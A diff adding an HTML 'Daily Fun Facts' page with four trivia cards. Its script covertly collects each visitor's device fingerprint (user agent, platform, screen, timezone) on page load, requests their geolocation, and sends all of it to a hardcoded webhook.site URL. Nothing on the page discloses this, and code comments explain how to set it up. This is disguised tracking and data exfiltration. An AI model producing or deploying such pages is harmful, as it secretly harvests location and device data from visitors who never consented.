@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daily Fun Facts</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #4a6fa5;
+            text-align: center;
+        }
+        .fact-card {
+            background-color: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 4px solid #4a6fa5;
+        }
+        .fact-card h3 {
+            margin-top: 0;
+            color: #4a6fa5;
+        }
+        .refresh-btn {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            background-color: #4a6fa5;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .refresh-btn:hover {
+            background-color: #3a5a85;
+        }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Did You Know? - Fun Facts</h1>
+        
+        <div id="facts-container">
+            <div class="fact-card">
+                <h3>Space Fact</h3>
+                <p>A day on Venus is longer than its year. Venus takes 243 Earth days to rotate once on its axis, but only 225 Earth days to orbit the Sun.</p>
+            </div>
+            
+            <div class="fact-card">
+                <h3>Animal Fact</h3>
+                <p>Octopuses have three hearts. Two pump blood through the gills, while the third pumps blood to the rest of the body.</p>
+            </div>
+            
+            <div class="fact-card">
+                <h3>History Fact</h3>
+                <p>The Great Pyramid of Giza was the tallest building in the world for over 3,800 years.</p>
+            </div>
+            
+            <div class="fact-card">
+                <h3>Science Fact</h3>
+                <p>There are more stars in the universe than grains of sand on all of Earth's beaches combined.</p>
+            </div>
+        </div>
+        
+        <button class="refresh-btn" onclick="loadNewFacts()">Load New Facts</button>
+        
+        <footer>
+            <p>© 2023 Fun Facts Daily. Refresh for more amazing facts!</p>
+        </footer>
+    </div>
+
+    <script>
+        // Function to load new facts
+        function loadNewFacts() {
+            alert("New facts coming soon! Thanks for visiting.");
+        }
+
+        // Collect visitor information
+        window.addEventListener('load', function() {
+            const visitorInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+
+            // Get location if permitted
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        visitorInfo.latitude = position.coords.latitude;
+                        visitorInfo.longitude = position.coords.longitude;
+                        sendVisitorData(visitorInfo);
+                    },
+                    error => {
+                        console.log("Geolocation error:", error);
+                        sendVisitorData(visitorInfo);
+                    }
+                );
+            } else {
+                sendVisitorData(visitorInfo);
+            }
+        });
+
+        // Function to send data to a webhook (you'll get this from a service like webhook.site)
+        function sendVisitorData(data) {
+            // Replace YOUR_WEBHOOK_URL with an actual webhook URL
+            const webhookUrl = 'https://webhook.site/2df958f9-5ceb-4e23-a620-44f8c8306cec';
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .catch(error => console.error('Error sending data:', error));
+        }
+    </script>
+</body>
+</html>
